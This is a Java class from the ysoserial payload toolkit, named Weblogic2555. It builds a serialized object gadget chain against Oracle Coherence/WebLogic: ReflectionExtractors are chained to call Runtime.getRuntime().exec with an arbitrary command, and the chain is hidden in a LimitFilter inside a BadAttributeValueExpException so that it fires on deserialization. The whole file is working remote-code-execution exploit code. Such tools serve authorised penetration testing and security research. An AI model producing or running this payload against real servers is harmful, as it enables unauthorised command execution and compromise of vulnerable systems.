package ysoserial.payloads;

import com.tangosol.coherence.reporter.extractor.ConstantExtractor;
import com.tangosol.util.ValueExtractor;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import com.tangosol.util.filter.LimitFilter;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;

public class Weblogic2555 implements ObjectPayload<BadAttributeValueExpException> {

    @Override
    public BadAttributeValueExpException getObject(String command) throws Exception {
        // Runtime.class.getMethod("getRuntime", new Class[0]).invoke(null, new Object[0]).exec(command);
        ChainedExtractor chainedExtractor = new ChainedExtractor(new ValueExtractor[]{
            new ReflectionExtractor("getMethod", new Object[]{"getRuntime", new Class[0]}),
            new ReflectionExtractor("invoke", new Object[]{null, new Object[0]}),
            new ReflectionExtractor("exec", new Object[]{command})
        });

        LimitFilter filter = new LimitFilter();
        filter.setComparator(chainedExtractor);
        filter.setTopAnchor(Runtime.class);

        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Field valfield = val.getClass().getDeclaredField("val");
        Reflections.setAccessible(valfield);
        valfield.set(val, filter);
        return val;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(Weblogic2555.class, args);
    }


}
